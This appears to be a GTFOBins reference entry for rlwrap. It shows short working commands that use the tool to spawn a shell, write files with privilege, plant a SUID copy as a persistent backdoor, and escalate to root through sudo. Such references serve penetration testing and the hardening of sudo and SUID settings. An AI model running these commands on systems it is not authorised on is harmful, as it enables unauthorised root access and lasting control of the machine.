# GTFOBin: rlwrap

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
rlwrap /bin/sh
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

This adds timestamps to the output file. This relies on the external `echo` command.

```
LFILE=file_to_write
rlwrap -l "$LFILE" echo DATA
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which rlwrap) .

./rlwrap -H /dev/null /bin/sh -p
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo rlwrap /bin/sh
```